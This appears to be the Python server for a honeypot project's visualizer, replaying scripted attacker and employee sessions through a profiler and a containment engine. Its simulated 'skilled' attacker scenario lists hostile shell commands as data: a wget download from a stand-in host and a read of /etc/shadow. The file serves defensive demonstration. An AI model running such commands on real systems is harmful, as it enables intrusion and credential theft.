"""Live LabyrinthAI overview. Run: python visualizer/server.py  ->  http://localhost:8765

Replays a scripted visitor session through the REAL Profiler (features.py), the integration
adapter, and the REAL Maze (game.py + rules.py), and serves the page. Standard library only.
"""
from __future__ import annotations
import json
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent
sys.path.insert(0, str(ROOT / "profiler"))
sys.path.insert(0, str(ROOT / "maze"))

from features import FeatureExtractor  # noqa: E402
from game import MazeEnv, MazeState  # noqa: E402
from rules import choose_action  # noqa: E402


def _t(sec: int) -> str:
    return f"2026-01-01T10:{sec // 60:02d}:{sec % 60:02d}Z"


# (seconds, source, event_type, extra fields, plain-English caption)
SCENARIOS = {
    "normal": [
        (0, "portal", "portal_auth_success", {"resource": "/login"}, "Logs into the staff portal"),
        (20, "database", "db_read", {"resource": "timesheets"}, "Opens their own timesheet"),
        (50, "database", "db_read", {"resource": "reports"}, "Reads a shared report"),
    ],
    # A real employee who asks for data outside their own access.
    "insider": [
        (0, "database", "db_read", {"resource": "payroll"}, "Asks to open everyone's salaries"),
        (10, "database", "db_read", {"resource": "board-minutes"}, "Opens confidential board minutes"),
        (22, "database", "db_read", {"resource": "contracts"}, "Browses customer contracts"),
        (35, "database", "db_read", {"resource": "finance"}, "Looks at the finance budget"),
    ],
    "skilled": [
        (0, "cowrie", "command", {"command": "whoami", "resource": "/bin/whoami"}, "Logs into the fake server and runs whoami"),
        (4, "cowrie", "command", {"command": "wget http://evil.test/p.sh", "resource": "/tmp/p.sh"}, "Downloads a tool onto the machine"),
        (7, "portal", "portal_auth_failure", {"resource": "/login"}, "Tries to guess the admin password on the web portal"),
        (9, "database", "db_read", {"resource": "customers"}, "Reads the customers table"),
        (11, "cowrie", "command", {"command": "sudo cat /etc/shadow", "resource": "/etc/shadow"}, "Tries to steal the password file"),
        (13, "database", "db_write", {"resource": "orders"}, "Writes into the orders table"),
        (14, "database", "db_write", {"resource": "customers"}, "Writes into the customers table"),
    ],
    "novice": [
        (0, "cowrie", "command", {"command": "ls", "resource": "/home"}, "Logs in and lists files"),
        (12, "cowrie", "command", {"command": "lss", "resource": "/home"}, "Makes a typo"),
        (31, "cowrie", "command", {"command": "pwd", "resource": "/home"}, "Checks where they are"),
        (58, "portal", "portal_auth_failure", {"resource": "/login"}, "Fails a portal login"),
        (90, "cowrie", "command", {"command": "help", "resource": "/home"}, "Asks for help, then goes quiet"),
    ],
}


def _icon(source: str, etype: str, extra: dict) -> tuple[str, str]:
    """Which picture the page draws for an event, plus the data name it touches."""
    cmd = extra.get("command", "")
    if source == "cowrie":
        if "wget" in cmd or "curl" in cmd:
            return "download", ""
        if "/etc/shadow" in cmd:
            return "secretfile", ""
        return "terminal", ""
    if source == "portal":
        return ("login" if etype.endswith("success") else "wrongpass"), ""
    return ("dbwrite" if "write" in etype or "delete" in etype else "dbread"), extra.get("resource", "")


def run_session(name: str) -> dict:
    extractor = FeatureExtractor()
    env = MazeEnv()
    steps = []
    for i, (sec, source, etype, extra, caption) in enumerate(SCENARIOS[name]):
        extractor.add_event({"session_id": name, "event_id": f"e{i}", "timestamp": _t(sec),
                             "source": source, "event_type": etype, **extra})
        f = extractor.features_for(name)
        # Same adapter as integration/run_all.py; exposure/alert capped at 2 so the state is non-terminal at reset.
        state = MazeState(
            turn=min(i, env.max_turns - 1),
            intel=min(3, int(f["distinct_resource_count"])),
            exposure=min(2, int(f["suspicious_command_count"])),
            alert=min(2, int(f["portal_auth_failure_count"] + f["wazuh_critical_severity_count"])),
            progress=min(3, int(f["database_write_count"] + f["database_delete_count"])),
        )
        obs, info = env.reset(options={"state": state})
        action = choose_action(obs, info["action_mask"])
        _, _, _, _, step = env.step(action)
        icon, tag = _icon(source, etype, extra)
        steps.append({"caption": caption, "icon": icon, "tag": tag,
                      "state": {k: getattr(state, k) for k in ("intel", "exposure", "alert", "progress")},
                      "executed": step["executed_action"], "contained": bool(step["success"])})
        if step["success"]:
            break
    return {"steps": steps, "outcome": "contained" if steps[-1]["contained"] else "still watching"}


STATIC = {"index.html": "text/html; charset=utf-8", "common.js": "text/javascript", "common.css": "text/css"}


class Handler(BaseHTTPRequestHandler):
    def _send(self, code: int, body: bytes, ctype: str):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        url = urlparse(self.path)
        name = "index.html" if url.path == "/" else url.path.lstrip("/")
        if name in STATIC:
            self._send(200, (HERE / name).read_bytes(), STATIC[name])
        elif url.path == "/api/run":
            scenario = parse_qs(url.query).get("scenario", ["skilled"])[0]
            if scenario not in SCENARIOS:
                self._send(400, b'{"error":"unknown scenario"}', "application/json")
                return
            self._send(200, json.dumps(run_session(scenario)).encode(), "application/json")
        else:
            self._send(404, b"not found", "text/plain")

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8765
    print(f"LabyrinthAI visualizer -> http://localhost:{port}")
    ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
